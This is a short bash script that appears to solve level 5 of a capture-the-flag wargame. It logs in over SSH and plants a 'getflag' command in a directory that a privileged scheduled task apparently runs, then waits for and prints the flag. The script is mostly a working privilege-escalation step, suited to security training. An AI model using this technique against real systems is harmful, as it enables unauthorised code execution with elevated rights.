#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

sshexec.sh "$host" "$port" level05 "$pass" 'set -e; echo "getflag > /tmp/flag05" > /opt/openarenaserver/level05.sh; until [ -f /tmp/flag05 ]; do sleep 10; done; cat /tmp/flag05'
